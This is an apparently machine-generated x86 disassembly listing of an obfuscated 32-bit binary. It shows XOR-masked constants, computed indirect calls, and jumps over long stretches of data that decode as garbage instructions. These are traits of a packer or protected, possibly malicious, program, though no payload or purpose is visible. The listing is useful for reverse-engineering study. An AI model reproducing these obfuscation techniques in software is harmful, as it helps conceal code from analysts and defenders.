  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	call   0x6dbb6e64
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415910
  41596b:	outs   dx,BYTE PTR ds:[esi]
  41596c:	sbb    al,0xcd
  41596e:	inc    eax
  41596f:	jl     0x415947
  415971:	add    al,0x96
  415973:	jecxz  0x4159e9
  415975:	in     eax,dx
  415976:	test   ch,ah
  415978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41597a:	dec    edx
  41597b:	pop    ds
  41597c:	mov    edx,0x95997d40
  415981:	push   esp
  415982:	push   eax
  415983:	in     eax,dx
  415984:	cmovl  esi,DWORD PTR [ebp+0x51]
  415988:	mov    dh,ch
  41598a:	push   edi
  41598b:	adc    dl,BYTE PTR ds:0xe7610c94
  415991:	ds adc al,0x96
  415994:	push   ebx
  415995:	and    ecx,DWORD PTR [ebp+0x10]
  415998:	inc    ebx
  415999:	jp     0x4159c5
  41599b:	inc    ebx
  41599c:	lea    eax,[eax-0x55]
  41599f:	and    ch,BYTE PTR [ebx+0x5e62ea4d]
  4159a5:	xchg   ecx,eax
  4159a6:	lahf   
  4159a7:	mov    bl,0x49
  4159a9:	js     0x4159cd
  4159ab:	iret   
  4159ac:	jl     0x41599a
  4159ae:	lds    ebx,FWORD PTR [ecx-0x1f]
  4159b1:	clc    
  4159b2:	add    BYTE PTR [ebx-0x6],bl
  4159b5:	inc    edi
  4159b6:	test   al,0x6
  4159b8:	lds    esi,FWORD PTR [edx+0x4b]
  4159bb:	dec    esi
  4159bc:	push   ecx
  4159bd:	aam    0xff
  4159bf:	adc    bh,BYTE PTR [edx+0x275752cd]
  4159c5:	test   ah,ah
  4159c7:	mov    ds:0x555f7272,al
  4159cc:	ds add eax,0x32ba153f
  4159d2:	xchg   ebx,eax
  4159d3:	(bad)  
  4159d5:	test   al,0xab
  4159d7:	repz or esi,esi
  4159da:	and    eax,0x416d3965
  4159df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159e0:	push   ds
  4159e1:	jo     0x415a2f
  4159e3:	mov    ?,WORD PTR [ebp+0x55]
  4159e6:	jp     0x4159b7
  4159e8:	mov    eax,0x7fa21d4e
  4159ed:	in     eax,0x14
  4159ef:	pop    edi
  4159f0:	and    ch,ch
  4159f2:	ret    
  4159f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f4:	adc    dh,dl
  4159f6:	shl    BYTE PTR [esi-0x43],0x1c
  4159fa:	xchg   ebp,eax
  4159fb:	jnp    0x4159b5
  4159fd:	je     0x415a00
  4159ff:	xchg   esp,eax
  415a00:	(bad)  
  415a01:	icebp  
  415a02:	inc    ecx
  415a03:	mov    cl,0xd0
  415a05:	ins    DWORD PTR es:[edi],dx
  415a06:	adc    DWORD PTR [ebx],edi
  415a08:	inc    esp
  415a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0a:	ficom  DWORD PTR [esi+0x7987fb52]
  415a10:	ss jae 0x415a47
  415a13:	outs   dx,BYTE PTR ds:[esi]
  415a14:	cmp    eax,0xac172319
  415a19:	inc    edi
  415a1a:	mov    esi,0x91cc2521
  415a1f:	mov    dl,0xc4
  415a21:	sti    
  415a22:	in     al,0xa6
  415a24:	jle    0x4159c9
  415a26:	adc    al,0x4f
  415a28:	mov    esp,DWORD PTR [edi]
  415a2a:	and    eax,0x801576f1
  415a2f:	jl     0x415a41
  415a31:	fisttp DWORD PTR [ebx+0x74]
  415a34:	push   esi
  415a35:	dec    ecx
  415a36:	inc    esi
  415a37:	inc    eax
  415a38:	dec    esp
  415a39:	inc    ecx
  415a3a:	lahf   
  415a3b:	stos   BYTE PTR es:[edi],al
  415a3c:	mov    eax,ds:0x2ce710fb
  415a41:	pop    ds
  415a42:	xor    al,0xe5
  415a44:	fcomip st,st(1)
  415a46:	or     eax,0x9a58b6d4
  415a4b:	sub    DWORD PTR [edx+edi*4+0x4b11dea5],ebx
  415a52:	hlt    
  415a53:	retf   
  415a54:	aad    0x53
  415a56:	and    eax,0x220b2042
  415a5b:	mov    ah,0x1
  415a5d:	pop    ecx
  415a5e:	pop    esp
  415a5f:	xchg   BYTE PTR [esi+0x39baff67],dh
  415a65:	push   esp
  415a66:	pop    esp
  415a67:	adc    eax,0x8bf992c5
  415a6c:	push   0xffffffb0
  415a6e:	and    DWORD PTR [ecx],0xffffffbd
  415a71:	jbe    0x415ad5
  415a73:	inc    ecx
  415a74:	loop   0x415ada
  415a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a77:	pop    ds
  415a78:	and    eax,0x5f16a4d2
  415a7d:	pop    ss
  415a7e:	and    al,0x44
  415a80:	cli    
  415a81:	inc    ebp
  415a82:	sbb    ebx,esp
  415a84:	mov    edx,0xbc199a21
  415a89:	ficomp DWORD PTR [edi+0x131ca537]
  415a8f:	pushf  
  415a90:	icebp  
  415a91:	es jg  0x415ae4
  415a94:	mov    eax,ds:0x67a251c6
  415a99:	(bad)  
  415a9a:	and    BYTE PTR [edx+0x16],dh
  415a9d:	or     al,0x7
  415a9f:	sub    bh,bl
  415aa1:	les    edi,FWORD PTR [ecx+0x16463872]
  415aa7:	push   esp
  415aa8:	jns    0x415a31
  415aaa:	sub    BYTE PTR [ecx],ah
  415aac:	imul   edi,ebp,0x501a8de8
  415ab2:	pop    ds
  415ab3:	jns    0x415af0
  415ab5:	pop    eax
  415ab6:	outs   dx,DWORD PTR ds:[esi]
  415ab7:	ficomp WORD PTR [edx-0x5c]
  415aba:	stc    
  415abb:	xor    BYTE PTR [edi+0x79],dh
  415abe:	sbb    bh,bh
  415ac0:	(bad)
  415ac4:	sbb    BYTE PTR [edx-0x25d00ad6],cl
  415aca:	rol    BYTE PTR [edi+0x23899b6f],1
  415ad0:	shl    eax,1
  415ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad3:	or     al,0xcf
  415ad5:	(bad)  
  415ad6:	cmp    cl,BYTE PTR [ebx-0x5d75174c]
  415adc:	mov    bh,0x98
  415ade:	lahf   
  415adf:	sub    ebp,DWORD PTR [eax+0x29]
  415ae2:	leave  
  415ae3:	sahf   
  415ae4:	dec    ecx
  415ae5:	xchg   ebp,eax
  415ae6:	into   
  415ae7:	pop    eax
  415ae8:	adc    ah,BYTE PTR [esi-0x6ffa739e]
  415aee:	ror    BYTE PTR [ebx],0x6
  415af1:	xchg   esp,eax
  415af2:	mov    al,0x52
  415af4:	mov    cl,0x95
  415af6:	loopne 0x415b02
  415af8:	retf   
  415af9:	stc    
  415afa:	and    eax,0xd2d62e85
  415aff:	dec    ebp
  415b00:	(bad)
  415b04:	leave  
  415b05:	add    eax,0x2ae7429
  415b0a:	mov    al,0x6f
  415b0c:	dec    edi
  415b0d:	mov    WORD PTR [ebx],cs
  415b0f:	inc    ebp
  415b10:	mov    edx,0x49ff4bff
  415b15:	aas    
  415b16:	cmc    
  415b17:	mov    ebx,0x76cbf441
  415b1c:	fst    QWORD PTR [edi-0x46]
  415b1f:	lds    esp,FWORD PTR [esi+0x36]
  415b22:	stos   DWORD PTR es:[edi],eax
  415b23:	pop    ebx
  415b24:	mov    dl,0x8c
  415b26:	sub    al,0x68
  415b28:	outs   dx,DWORD PTR ds:[esi]
  415b29:	pop    esi
  415b2a:	pop    eax
  415b2b:	idiv   DWORD PTR [eax-0x3d]
  415b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b2f:	lea    edx,[esp+eax*1]
  415b32:	push   cs
  415b33:	ins    DWORD PTR es:[edi],dx
  415b34:	mov    edx,0x81066fc3
  415b39:	les    eax,FWORD PTR [edx+eax*8]
  415b3c:	pop    ebx
  415b3d:	jl     0x415b27
  415b3f:	pop    esp
  415b40:	ss mov ebx,0x9cf805ec
  415b46:	hlt    
  415b47:	nop
  415b48:	mov    edx,0x8462d9cb
  415b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b4e:	cld    
  415b4f:	es push edi
  415b51:	out    0xf0,al
  415b53:	sub    DWORD PTR [ebx+0x41],eax
  415b56:	fdiv   DWORD PTR [ebp+0x15]
  415b59:	dec    edi
  415b5a:	mov    ds:0xef3a25ca,eax
  415b5f:	test   al,0xf8
  415b61:	add    al,0x21
  415b63:	push   0xffffffd1
  415b65:	loope  0x415b6d
  415b67:	scas   eax,DWORD PTR es:[edi]
  415b68:	sbb    bl,al
  415b6a:	inc    eax
  415b6b:	cdq    
  415b6c:	fbstp  TBYTE PTR [eax+0x7f]
  415b6f:	inc    esp
  415b70:	xchg   esi,eax
  415b71:	add    bh,BYTE PTR [esi+0x79e90c8d]
  415b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b78:	mov    edx,0x80e2e01e
  415b7d:	sbb    eax,0xd5aafed7
  415b82:	dec    ebp
  415b83:	and    bl,al
  415b85:	jns    0x415bc7
  415b87:	out    0x63,al
  415b89:	mov    ebx,0x3abfc2f7
  415b8e:	call   0x985f:0x4eb9bb7
  415b95:	not    DWORD PTR ss:[ecx-0x4f17dc67]
  415b9c:	inc    eax
  415b9d:	enter  0x7d22,0x19
  415ba1:	pop    ebx
  415ba2:	cmp    DWORD PTR [edx+0x1e],0xffffffb0
  415ba6:	mov    ch,0xf1
  415ba8:	pop    esi
  415ba9:	in     al,dx
  415baa:	repz mov al,0x46
  415bad:	push   ebp
  415bae:	test   al,0xe6
  415bb0:	jmp    0x7aadc83a
  415bb5:	sub    eax,0x385a70a8
  415bba:	mov    edi,0xf1c021e6
  415bbf:	xchg   ecx,eax
  415bc0:	xchg   BYTE PTR [edi+0x41],dh
  415bc3:	lods   al,BYTE PTR ds:[esi]
  415bc4:	ror    DWORD PTR ds:0x48ec9711,1
  415bca:	sub    eax,0x62b2ffee
  415bcf:	push   edx
  415bd0:	nop
  415bd1:	jbe    0x415bb3
  415bd3:	out    0x2,al
  415bd5:	sbb    al,0x99
  415bd7:	ja     0x415bd1
  415bd9:	mov    ah,0xd
  415bdb:	pop    edi
  415bdc:	fcom   DWORD PTR ds:0x927245ac
  415be2:	xor    esp,DWORD PTR [ebx]
  415be4:	mov    al,ds:0xac908f38
  415be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bea:	into   
  415beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bec:	ins    BYTE PTR es:[edi],dx
  415bed:	je     0x415b76
  415bef:	(bad)  
  415bf0:	and    ebp,eax
  415bf2:	addr16 (bad) 
  415bf4:	out    dx,eax
  415bf5:	shl    BYTE PTR [edi+0x7b],1
  415bf8:	lds    eax,FWORD PTR [eax+0x51]
  415bfb:	jge    0x415c2e
  415bfd:	mov    ds:0xb0a0964b,eax
  415c02:	xchg   ebp,eax
  415c03:	iret   
  415c04:	(bad)  
  415c05:	push   ecx
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42a815,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7d9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a89d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	popf   
  415c40:	loop   0x415c3d
  415c42:	or     DWORD PTR [edx-0x6a8780eb],0xc078787e
  415c4c:	fs inc eax
  415c4e:	inc    edx
  415c4f:	lods   eax,DWORD PTR ds:[esi]
  415c50:	ds cli 
  415c52:	ret    0xb6c5
  415c55:	stc    
  415c56:	(bad)  
  415c57:	xlat   BYTE PTR ds:[ebx]
  415c58:	ja     0x415c69
  415c5a:	jg     0x415ccf
  415c5c:	inc    ecx
  415c5d:	mov    DWORD PTR [ebx-0x54],ecx
  415c60:	mov    bl,0xdb
  415c62:	add    DWORD PTR [edx+0x44],ebx
  415c65:	jb     0x415c7f
  415c67:	arpl   WORD PTR fs:[edi-0x5341e02f],si
  415c6e:	retf   0x747d
  415c71:	inc    esi
  415c72:	or     dl,BYTE PTR [ebx+eax*2+0x1e81e45d]
  415c79:	out    dx,eax
  415c7a:	pop    ds
  415c7b:	cmp    DWORD PTR [edx],edi
  415c7d:	in     eax,0x21
  415c7f:	test   esp,0x136f75e2
  415c85:	cmp    DWORD PTR [edx+0x43],esi
  415c88:	cwde   
  415c89:	mov    esi,0x133c9d7e
  415c8e:	test   al,0xe3
  415c90:	test   DWORD PTR [eax+ebx*4-0x405594e1],ebp
  415c97:	sub    DWORD PTR [edx],edx
  415c99:	stc    
  415c9a:	jmp    0x9c508a1d
  415c9f:	es inc esp
  415ca1:	std    
  415ca2:	jno    0x415d11
  415ca4:	out    dx,al
  415ca5:	call   0x8a2f0807
  415caa:	mov    eax,0x460a179f
  415caf:	adc    al,0x51
  415cb1:	stos   BYTE PTR es:[edi],al
  415cb2:	enter  0x93b4,0x30
  415cb6:	dec    edi
  415cb7:	add    al,0x27
  415cb9:	test   al,0xb5
  415cbb:	xor    edi,DWORD PTR [edx-0xbbdfc54]
  415cc1:	mov    ebp,0xfa6ac0d7
  415cc6:	mov    ebx,0x29f52b74
  415ccb:	ret    
  415ccc:	jnp    0x415c66
  415cce:	push   esp
  415ccf:	leave  
  415cd0:	xchg   esp,eax
  415cd1:	inc    ecx
  415cd2:	push   eax
  415cd3:	fcom   DWORD PTR [esi]
  415cd5:	cs push ds
  415cd7:	sub    ebx,DWORD PTR fs:[ebx-0x63c56189]
  415cde:	or     edi,esi
  415ce0:	xchg   edi,eax
  415ce1:	mov    ch,0x50
  415ce3:	es aas 
  415ce5:	adc    cl,BYTE PTR [eax-0x54fe422d]
  415ceb:	pop    edx
  415cec:	je     0x415d18
  415cee:	test   al,0x64
  415cf0:	aad    0xd1
  415cf2:	cmp    eax,DWORD PTR [esp+ecx*4-0x30e3ef1f]
  415cf9:	hlt    
  415cfa:	inc    eax
  415cfb:	mov    edx,0x15a2849b
  415d00:	aaa    
  415d01:	sbb    eax,0x6f10dfc
  415d06:	xor    BYTE PTR [esi+ebp*2],0xcb
  415d0a:	in     eax,dx
  415d0b:	ss mov ch,0x93
  415d0e:	test   al,0x23
  415d10:	xor    bh,BYTE PTR ds:0x48c74c7e
  415d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d17:	out    dx,eax
  415d18:	xchg   ebx,eax
  415d19:	push   ebx
  415d1a:	out    0x29,eax
  415d1c:	mov    edi,0x4a8bea55
  415d21:	pop    ds
  415d22:	xchg   esp,eax
  415d23:	mov    ds:0xd6d7b908,eax
  415d28:	fsubr  QWORD PTR [ebx+edx*1]
  415d2b:	sub    eax,0x94743fee
  415d30:	pop    edi
  415d31:	ja     0x415dab
  415d33:	mov    edi,0x61c9201a
  415d38:	pop    ss
  415d39:	imul   ebp,DWORD PTR [ebx+0x4979a24c],0xb62c95f2
  415d43:	inc    ebp
  415d44:	mov    ebp,0x4ddf2e1f
  415d49:	cld    
  415d4a:	mov    edi,0x16f83595
  415d4f:	int3   
  415d50:	inc    BYTE PTR [eax-0x407cb5ef]
  415d56:	xor    edi,ebx
  415d58:	mov    ah,ch
  415d5a:	loopne 0x415d4d
  415d5c:	mov    eax,0x7eac6555
  415d61:	pushf  
  415d62:	xchg   edx,eax
  415d63:	imul   edx,DWORD PTR [ecx+0x24],0x49e3bc17
  415d6a:	cmc    
  415d6b:	adc    al,0x73
  415d6d:	rol    BYTE PTR [ebp-0x19426a3d],cl
  415d73:	and    dh,BYTE PTR [edi+0x1c27c31f]
  415d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d7a:	int3   
  415d7b:	pop    esi
  415d7c:	mov    al,0xc5
  415d7e:	xor    edi,DWORD PTR [edx]
  415d80:	jmp    0x832e:0x4cf1420b
  415d87:	push   esp
  415d88:	or     al,0x4f
  415d8a:	jmp    0x2d14:0xdae36035
  415d91:	xlat   BYTE PTR ds:[ebx]
  415d92:	dec    edx
  415d93:	add    eax,0x3bea1dfe
  415d98:	mov    bl,0xd6
  415d9a:	sar    eax,cl
  415d9c:	pushf  
  415d9d:	mov    eax,0x9bec8273
  415da2:	pop    ss
  415da3:	dec    esp
  415da4:	pop    ss
  415da5:	scas   al,BYTE PTR es:[edi]
  415da6:	je     0x415e14
  415da8:	fmul   QWORD PTR [edx-0x520ee6dc]
  415dae:	push   edi
  415daf:	(bad)  
  415db0:	loopne 0x415d78
  415db2:	mov    gs,WORD PTR [ebx-0x7577bb33]
  415db8:	jg     0x415dc5
  415dba:	ins    DWORD PTR es:[edi],dx
  415dbb:	aaa    
  415dbc:	(bad)  
  415dbd:	push   ecx
  415dbe:	(bad)  
  415dc0:	and    ah,BYTE PTR [edx+eiz*2+0x5730e54f]
  415dc7:	js     0x415db5
  415dc9:	sub    al,BYTE PTR ds:0x385761e2
  415dcf:	nop
  415dd0:	xlat   BYTE PTR ds:[ebx]
  415dd1:	fistp  QWORD PTR [edx+ebx*2]
  415dd4:	fdiv   DWORD PTR ss:[esi-0x1]
  415dd8:	xchg   esp,eax
  415dd9:	test   DWORD PTR [edx+0x6c40ae11],eax
  415ddf:	and    DWORD PTR [edi+eax*2],0xffffffab
  415de3:	push   ebp
  415de4:	push   esi
  415de5:	mov    esp,0xd5cbb73f
  415dea:	(bad)  
  415deb:	repz int3 
  415ded:	and    eax,0x3ddcca0a
  415df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df3:	fwait
  415df4:	jmp    0x39f0:0xb4164773
  415dfb:	mov    ss,edx
  415dfd:	fwait
  415dfe:	adc    DWORD PTR [ebp-0x4b5a6bf4],ecx
  415e04:	jmp    0x6fe4:0x8ee02221
  415e0b:	hlt    
  415e0c:	xor    DWORD PTR [edx-0x63],edx
  415e0f:	icebp  
  415e10:	sbb    al,0x45
  415e12:	inc    ebx
  415e13:	add    BYTE PTR [esi-0x56],0x2f
  415e17:	std    
  415e18:	xchg   ecx,eax
  415e19:	xlat   BYTE PTR ds:[ebx]
  415e1a:	bound  ebp,QWORD PTR [ecx-0x4fb91bdf]
  415e20:	jmp    0x4c7a:0xf2f29f9d
  415e27:	sar    DWORD PTR [ecx+eiz*8+0x286d45f2],0xbd
  415e2f:	mov    ah,0x96
  415e31:	pop    eax
  415e32:	and    eax,0xfa5a0220
  415e37:	mov    ebx,0x72bf1f17
  415e3c:	pop    es
  415e3d:	int    0x1e
  415e3f:	jp     0x415e06
  415e41:	jmp    0x415e1f
  415e43:	inc    cx
  415e45:	(bad)  
  415e46:	jns    0x415e76
  415e48:	jnp    0x415e27
  415e4a:	mov    fs:0x65d9ccf2,al
  415e50:	out    0xb5,eax
  415e52:	xor    eax,0x3d386a3f
  415e57:	dec    ebx
  415e58:	js     0x415ec7
  415e5a:	sub    BYTE PTR [ecx+0x8],dl
  415e5d:	retf   
  415e5e:	push   DWORD PTR [ecx-0x5d]
  415e61:	aas    
  415e62:	mov    es,WORD PTR [esi-0x7f]
  415e65:	jl     0x415e0f
  415e67:	das    
  415e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e69:	mov    ecx,0x7842e88e
  415e6e:	inc    esp
  415e6f:	cmp    ebx,DWORD PTR fs:[ebx-0x68]
  415e73:	stos   BYTE PTR es:[edi],al
  415e74:	pop    ss
  415e75:	jmp    0x66b4934c
  415e7a:	sbb    edx,edx
  415e7c:	lahf   
  415e7d:	sub    eax,0x4de78907
  415e82:	sub    al,0xb5
  415e84:	addr16 ja 0x415ea9
  415e87:	cmp    cl,BYTE PTR [ebx+0x11d389ba]
  415e8d:	inc    ebx
  415e8e:	lock push esp
  415e90:	nop
  415e91:	xor    eax,0x7d486976
  415e96:	jg     0x415ef5
  415e98:	xor    eax,0x75f5763c
  415e9d:	fisubr WORD PTR [ebx]
  415e9f:	dec    ebx
  415ea0:	sub    ecx,eax
  415ea2:	add    BYTE PTR [esi-0x343beaf8],al
  415ea8:	xor    BYTE PTR [eax+0x61],dh
  415eab:	adc    bl,dl
  415ead:	xor    al,0xf8
  415eaf:	in     eax,0x31
  415eb1:	(bad)  
  415eb2:	and    al,0x1
  415eb4:	xchg   edi,eax
  415eb5:	arpl   WORD PTR [esi],bx
  415eb7:	pop    edi
  415eb8:	jp     0x415f33
  415eba:	lds    ecx,FWORD PTR [esi+0x3a]
  415ebd:	int    0xde
  415ebf:	ds jns 0x415eaa
  415ec2:	aas    
  415ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ec4:	test   al,0x1a
  415ec6:	cdq    
  415ec7:	fiadd  DWORD PTR [esi+0xa5a509e]
  415ecd:	out    dx,eax
  415ece:	ds and eax,0x939a4a17
  415ed4:	mov    bl,0x54
  415ed6:	fs std 
  415ed8:	aam    0x53
  415eda:	stc    
  415edb:	cmp    DWORD PTR [edx+0x4358ecca],ebp
  415ee1:	loopne 0x415e93
  415ee3:	rcl    eax,1
  415ee5:	daa    
  415ee6:	mov    DWORD PTR [ebp-0x8],eax
  415ee9:	mov    DWORD PTR ds:0x42a79d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a821,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a825,0x42a7e1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	mov    edx,0x27832aba
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415faf
  415f57:	or     eax,0x26ca7d66
  415f5c:	repz jbe 0x415f7c
  415f5f:	and    ecx,DWORD PTR [eax]
  415f61:	mov    ah,0x32
  415f63:	fisttp QWORD PTR [edx+0x5d]
  415f66:	lods   eax,DWORD PTR ds:[esi]
  415f67:	xchg   edi,eax
  415f68:	mov    ebp,0x4c8ec7b1
  415f6d:	mov    eax,ds:0x57eda7f1
  415f72:	(bad)  
  415f74:	nop
  415f75:	lea    esp,[ebp+eiz*4+0x51116e85]
  415f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f7d:	mov    edx,0x4edd1b82
  415f82:	loop   0x415fe5
  415f84:	daa    
  415f85:	pop    es
  415f86:	inc    ecx
  415f87:	xor    al,BYTE PTR [edi]
  415f89:	jp     0x415ff8
  415f8b:	pushf  
  415f8c:	jo     0x415f13
  415f8e:	ins    DWORD PTR es:[edi],dx
  415f8f:	and    al,0xf0
  415f91:	pop    es
  415f92:	mov    ebp,edi
  415f94:	push   eax
  415f95:	or     al,0xa1
  415f97:	cdq    
  415f98:	pop    ecx
  415f99:	sub    ecx,DWORD PTR [ecx-0x4e587d2e]
  415f9f:	inc    esi
  415fa0:	fbstp  TBYTE PTR [edi+0x59]
  415fa3:	gs (bad) 
  415fa6:	inc    edi
  415fa7:	xlat   BYTE PTR ds:[ebx]
  415fa8:	pusha  
  415fa9:	jecxz  0x415f58
  415fab:	popa   
  415fac:	shl    ah,1
  415fae:	stc    
  415faf:	or     al,0x44
